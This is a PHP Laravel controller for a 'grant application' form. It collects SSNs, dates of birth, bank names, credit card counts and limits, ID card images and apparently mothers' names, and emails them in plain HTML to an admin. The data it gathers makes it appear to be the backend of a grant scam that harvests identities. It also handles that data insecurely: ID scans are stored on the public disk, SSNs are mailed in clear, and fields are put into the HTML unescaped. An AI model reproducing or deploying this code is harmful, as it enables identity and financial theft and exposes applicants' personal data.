<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Models\Application;
use App\Mail\ApplicationConfirmation;
use App\Mail\GrantApplicationMail;
use Illuminate\Support\Str;
use Illuminate\Support\Facades\Mail;
use Illuminate\Support\Facades\Log;
use Illuminate\Validation\Rule;
use Illuminate\Validation\ValidationException;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Storage;
use Illuminate\Support\Facades\Validator;

class ApplicationController extends Controller
{
  /**
   * Handle the submission of a new application.
   *
   * This method orchestrates the entire application submission process:
   * 1. Validates incoming request data with custom error messages for each field.
   * 2. Sanitizes and processes the data, including file uploads for ID images.
   * 3. Stores the application in the database using a transaction for atomicity.
   * 4. Sends an email with all form inputs as pretty-printed JSON (and attaches ID images if present).
   * 5. If mail fails, rolls back the DB save and deletes any uploaded files.
   * 6. Always returns a user-friendly JSON response indicating success or failure.
   *
   * @param Request $request The HTTP request containing form data and files.
   * @return \Illuminate\Http\JsonResponse JSON response with status, message, and reference info.
   */
  public function submit(Request $request)
  {
    // 1. Define validation rules for each input field.
    // These rules ensure required fields, correct formats, and value constraints.
    $rules = [
      'first_name'    => ['required', 'string', 'min:2', 'max:100'],
      'middle_name'   => ['nullable', 'string', 'min:2', 'max:100'],
      'last_name'     => ['required', 'string', 'min:2', 'max:100'],
      'email'         => ['required', 'email', 'max:255'],
      'phone_number'  => ['required', 'string', 'max:20'], // further digit validation below
      'address'       => ['required', 'string', 'min:5', 'max:255'],
      'zipCode'       => ['required', 'regex:/^\d{5}$/'],
      'city'          => ['required', 'regex:/^[a-zA-Z\s\-]+$/', 'max:100'],
      'state'         => ['required', 'regex:/^[a-zA-Z\s\-]+$/', 'max:100'],
      'gender'        => ['required'],
      'dob'           => ['required', 'date', 'before:today', 'date_format:Y-m-d'],
      'income'        => ['required', 'string', 'max:50'],
      'amount_applied' => ['string', 'required'],
      // Accept SSN in formatted or digits form; we'll enforce digit count after stripping non-digits
      'ssn'           => ['required', 'string',  'max:9'],
      'bank_name'     => ['nullable', 'string', 'max:100'],
      'has_cards'     => ['required', 'in:yes,no'],
      'id_front'      => ['nullable', 'file', 'image', 'max:2048'],
      'id_back'       => ['nullable', 'file', 'image', 'max:2048'],
    ];

    // If the applicant has cards, require additional card-related fields.
    if ($request->input('has_cards') === 'yes') {
      $rules['no_of_cards'] = ['required', 'integer', 'min:1'];
      $rules['card_limit'] = ['required', 'numeric', 'min:3'];
    }

    // 2. Custom error messages for each field and rule.
    // This provides user-friendly feedback for validation errors.
    $messages = [
      'first_name.required'    => 'First name is required.',
      'first_name.string'      => 'First name must be a valid string.',
      'first_name.min'         => 'First name must be at least 2 characters.',
      'first_name.max'         => 'First name cannot exceed 100 characters.',

      'middle_name.string'     => 'Middle name must be a valid string.',
      'middle_name.min'        => 'Middle name must be at least 2 characters.',
      'middle_name.max'        => 'Middle name cannot exceed 100 characters.',

      'last_name.required'     => 'Last name is required.',
      'last_name.string'       => 'Last name must be a valid string.',
      'last_name.min'          => 'Last name must be at least 2 characters.',
      'last_name.max'          => 'Last name cannot exceed 100 characters.',

      'email.required'         => 'Email address is required.',
      'email.email'            => 'Please provide a valid email address.',
      'email.max'              => 'Email address cannot exceed 255 characters.',

      'phone_number.required'  => 'Phone number is required.',
      'phone_number.string'    => 'Phone number must be a valid string.',
      'phone_number.max'       => 'Phone number cannot exceed 20 characters.',

      'address.required'       => 'Address is required.',
      'address.string'         => 'Address must be a valid string.',
      'address.min'            => 'Address must be at least 5 characters.',
      'address.max'            => 'Address cannot exceed 255 characters.',

      'zipCode.required'       => 'Zip code is required.',
      'zipCode.regex'          => 'Zip code must be exactly 5 digits.',

      'city.required'          => 'City is required.',
      'city.regex'             => 'City may only contain letters, spaces, and hyphens.',
      'city.max'               => 'City cannot exceed 100 characters.',

      'state.required'         => 'State is required.',
      'state.regex'            => 'State may only contain letters, spaces, and hyphens.',
      'state.max'              => 'State cannot exceed 100 characters.',

      'gender.required'        => 'Gender is required.',


      'dob.required'           => 'Date of birth is required.',
      'dob.date'               => 'Date of birth must be a valid date.',
      'dob.before'             => 'Date of birth must be before today.',
      'dob.date_format'        => 'Date of birth must be in the format YYYY-MM-DD.',

      'income.required'        => 'Income is required.',
      'income.string'          => 'Income must be a valid string.',
      'income.max'             => 'Income cannot exceed 50 characters.',

      'ssn.required'           => 'SSN is required.',
      'ssn.string'             => 'SSN must be a valid string.',

      'ssn.max'                => 'SSN cannot exceed 9 digits.',
      'ssn.unique'             => 'An application with this SSN already exists.',

      'bank_name.string'       => 'Bank name must be a valid string.',
      'bank_name.max'          => 'Bank name cannot exceed 100 characters.',

      'has_cards.required'     => 'Please specify if you have cards.',
      'has_cards.in'           => 'Has cards must be yes or no.',

      'id_front.file'          => 'Front ID must be a file.',
      'id_front.image'         => 'Front ID must be an image.',
      'id_front.max'           => 'Front ID image cannot exceed 2MB.',

      'id_back.file'           => 'Back ID must be a file.',
      'id_back.image'          => 'Back ID must be an image.',
      'id_back.max'            => 'Back ID image cannot exceed 2MB.',

      'no_of_cards.required'   => 'Number of cards is required.',
      'no_of_cards.integer'    => 'Number of cards must be an integer.',
      'no_of_cards.min'        => 'Number of cards must be at least 1.',

      'card_limit.required'    => 'Card limit is required.',
      'card_limit.numeric'     => 'Card limit must be a number.',
      'card_limit.min'         => 'Card limit must be at least 3.',
    ];

    // Track uploaded file paths for cleanup in any failure scenario.
    $storedFront = null;
    $storedBack = null;

    try {
      /**
       * Validate the request using Laravel's validator with custom messages.
       * Throws ValidationException if validation fails.
       */
      $validated = $request->validate(
        $rules,
        $messages,

      );

      /**
       * Backend enforcement of digits-only / length rules for phone and SSN.
       * Ensures phone is 10-15 digits and SSN is 4 or 9 digits.
       * Returns a JSON error response if these checks fail.
       */
      // Phone: Remove all non-digit characters and ensure length is between 10 and 15 digits.
      $phoneDigits = preg_replace('/\D/', '', $validated['phone_number'] ?? '');
      if (strlen($phoneDigits) < 10 || strlen($phoneDigits) > 15) {
        return response()->json([
          'status' => 'error',
          'message' => 'Phone number must contain only digits and be between 10 and 15 digits.',
          'errors' => ['phone_number' => ['Phone number must contain only digits and be between 10 and 15 digits.']],
        ], 422);
      }
      $validated['phone_number'] = $phoneDigits;

      // SSN: Remove all non-digit characters and ensure it is either 4 or 9 digits.
      $ssnDigits = preg_replace('/\D/', '', $validated['ssn'] ?? '');
      if (!in_array(strlen($ssnDigits), [4, 9], true)) {
        return response()->json([
          'status' => 'error',
          'message' => 'SSN must be  9 digits.',
          'errors' => ['ssn' => ['SSN must be 9 digits.']],
        ], 422);
      }
      $validated['ssn'] = $ssnDigits;

      // Zip code is already validated by regex to be exactly 5 digits.

      /**
       * Store uploaded files (if any) and get their storage paths.
       * Files are saved to the public disk so they can be attached to emails.
       */
      // Save the front and back ID images to the public storage, if provided.
      if ($request->hasFile('id_front')) {
        $storedFront = $request->file('id_front')->store('uploads/front_id', 'public');
      }
      if ($request->hasFile('id_back')) {
        $storedBack = $request->file('id_back')->store('uploads/back_id', 'public');
      }

      /**
       * Sanitize string fields to prevent XSS and trim whitespace.
       * Only fields present in the validated data and of string type are sanitized.
       */
      $stringFields = [
        'first_name',
        'middle_name',
        'last_name',
        'address',
        'city',
        'state',
        'bank_name',
        'maritalStatus',
        'nextOfKin',
        'motherName',
        'hearingStatus',
        'housingType',
        'phoneCourier',
        'grantSelect',
        'grantDescription'
      ];
      foreach ($stringFields as $f) {
        if (isset($validated[$f]) && is_string($validated[$f])) {
          $validated[$f] = trim(strip_tags($validated[$f]));
        }
      }

      /**
       * Generate a unique application reference number.
       * Format: APP-YYYYMMDD-RANDOM5 (e.g., APP-20240609-ABCDE)
       */
      $reference = 'APP-' . now()->format('Ymd') . '-' . strtoupper(Str::random(5));

      /**
       * Prepare the data for insertion, only including fillable fields from the model.
       * This prevents mass assignment vulnerabilities.
       */
      $fillable = (new Application())->getFillable();
      $insert = [];

      foreach ($fillable as $col) {
        // Handle file paths for ID images.
        if ($col === 'id_front' && $storedFront) {
          $insert['id_front'] = $storedFront;
          continue;
        }
        if ($col === 'id_back' && $storedBack) {
          $insert['id_back'] = $storedBack;
          continue;
        }
        // Always set the generated reference.
        if ($col === 'reference') {
          $insert['reference'] = $reference;
          continue;
        }
        // Add validated fields if present.
        if (array_key_exists($col, $validated)) {
          $insert[$col] = $validated[$col];
        }
      }

      /**
       * Ensure the reference is present in the insert array.
       */
      if (!array_key_exists('reference', $insert)) {
        $insert['reference'] = $reference;
      }

      /**
       * Use a database transaction to ensure DB save and mail send are atomic.
       * Send both admin notification and user confirmation emails.
       */
      $result = DB::transaction(function () use (
        $insert,
        $storedFront,
        $storedBack,
        $validated
      ) {
        // Create the application record in the database.
        $application = Application::create($insert);

        // Prepare the email payload for admin notification (no file paths here).
        $emailData = $insert;
        unset($emailData['id_front'], $emailData['id_back']);
        $emailData['application_id'] = $application->id;

        $recipient = config('mail.application_notify_email');

        // Send admin notification email with retry logic
        $maxAttempts = 3;
        $attempt = 0;
        $adminEmailSent = false;
        $lastMailException = null;

        while ($attempt < $maxAttempts && !$adminEmailSent) {
          try {

            $htmlBody = "
          <h1>New Grant Application Submitted</h1>
          <p style='color: blue; font-size: 18px; '><strong>Reference:</strong> {$insert['reference']}</p><br>
          <p><strong>First Name:</strong> {$insert['first_name']} </p>
          <p><strong>Middle Name:</strong> {$insert['middle_name']}</p>
          <p><strong>Last Name:</strong> {$insert['last_name']}</p
          <p><strong>Email:</strong> {$insert['email']}</p>
          <p><strong>Phone:</strong> {$insert['phone_number']}</p>
          <p><strong>Address:</strong> {$insert['address']} </p>
          <p><strong>Zip Code:</strong> {$insert['zipCode']}</p>
          <p><strong>City:</strong> {$insert['city']}</p>
          <p><strong>State:</strong> {$insert['state']}</p>
          <p><strong>Gender:</strong> {$insert['gender']}</p>
          <p><strong>Date of Birth:</strong> {$insert['dob']}</p>
          
          <p><strong>Income:</strong> {$insert['income']}</p>
          <p><strong>SSN:</strong> {$insert['ssn']}</p>
          <p><strong>Bank Name:</strong> {$insert['bank_name']}</p>
          <p><strong>Has Credit Cards ?:</strong> {$insert['has_cards']}</p>
          <p><strong>Number of Cards:</strong> " . ($insert['no_of_cards'] ?? 'N/A') . "</p>
          <p><strong>Card Limit:</strong> " . ($insert['card_limit'] ?? 'N/A') . "</p>
          <br>

          <p><strong>Amount Applied:</strong> {$insert['amount_applied']}</p>
          
";


            Mail::to($recipient)->send(new GrantApplicationMail($application, $htmlBody, $storedFront, $storedBack));

            $adminEmailSent = true;
          } catch (\Exception $mailEx) {
            $lastMailException = $mailEx;
            $attempt++;
            if ($attempt < $maxAttempts) {
              usleep(200000); // 200ms delay before retry
            }
          }
        }

        // Send user confirmation email with retry logic
        $userEmailSent = false;
        $attempt = 0;

        while ($attempt < $maxAttempts && !$userEmailSent) {
          try {
            /**
             * Send confirmation email to the user using the ApplicationConfirmation mailable.
             */
            Mail::to($validated['email'])->send(new ApplicationConfirmation($application));
            $userEmailSent = true;

            Log::info('Application confirmation email sent successfully', [
              'reference' => $application->reference,
              'email' => $validated['email']
            ]);
          } catch (\Exception $mailEx) {
            $lastMailException = $mailEx;
            $attempt++;
            if ($attempt < $maxAttempts) {
              usleep(200000); // 200ms delay before retry
            }

            Log::warning('Failed to send user confirmation email, attempt ' . ($attempt + 1), [
              'reference' => $application->reference,
              'email' => $validated['email'],
              'error' => $mailEx->getMessage()
            ]);
          }
        }

        // Check if both emails were sent successfully
        if (!$adminEmailSent) {
          Log::error('Admin notification email failed after all attempts', [
            'reference' => $application->reference,
            'error' => $lastMailException ? $lastMailException->getMessage() : 'Unknown error'
          ]);
          throw new \RuntimeException('admin_mail_failed');
        }

        // User email failure is not critical - we'll log it but not fail the transaction
        if (!$userEmailSent) {
          Log::error('User confirmation email failed after all attempts', [
            'reference' => $application->reference,
            'email' => $validated['email'],
            'error' => $lastMailException ? $lastMailException->getMessage() : 'Unknown error'
          ]);
          // Don't throw - application should still be saved even if user email fails
        }

        // Return application and file paths for response.
        return [
          'application' => $application,
          'storedFront' => $storedFront,
          'storedBack' => $storedBack,
          'userEmailSent' => $userEmailSent,
        ];
      });

      /**
       * If everything succeeds, return a success response with reference and file paths (if any).
       */
      $response = [
        'status' => 'success',
        'message' => 'Application submitted successfully.',
        'reference' => $insert['reference'],
        'application_id' => $result['application']->id,
        'stored_front_path' => $result['storedFront'],
        'stored_back_path' => $result['storedBack'],
      ];

      // Add note if user confirmation email failed
      if (!$result['userEmailSent']) {
        $response['warning'] = 'Application saved but confirmation email could not be sent. Please save your reference number: ' . $insert['reference'];
      }

      return response()->json($response, 200);
    } catch (ValidationException $e) {
      /**
       * Handle validation errors and return them in a structured JSON response.
       */
      return response()->json([
        'status' => 'error',
        'message' => 'Validation failed.',
        'errors' => $e->errors(),
      ], 422);
    } catch (\Exception $e) {
      /**
       * Always clean up uploaded files if mail or DB fails.
       * This ensures no orphaned files are left if the transaction is rolled back.
       */
      if ($storedFront) {
        try {
          Storage::disk('public')->delete($storedFront);
        } catch (\Throwable $ex) {
        }
      }
      if ($storedBack) {
        try {
          Storage::disk('public')->delete($storedBack);
        } catch (\Throwable $ex) {
        }
      }

      /**
       * Handle different types of mail failures.
       */
      if ($e->getMessage() === 'admin_mail_failed') {
        Log::error('Application admin notification failed after retries, DB rolled back and files deleted.');
        return response()->json([
          'status' => 'error',
          'message' => 'We could not process your application due to a mail server issue. Please try again later. No data was saved.',
        ], 500);
      }

      Log::error('Application submit error: ' . $e->getMessage(), [
        'exception' => $e,
        'trace' => $e->getTraceAsString(),
      ]);
      return response()->json([
        'status' => 'error',
        'message' => 'We could not process your application due to a server issue. Please try again later. No data was saved.',
      ], 500);
    }
  }
}
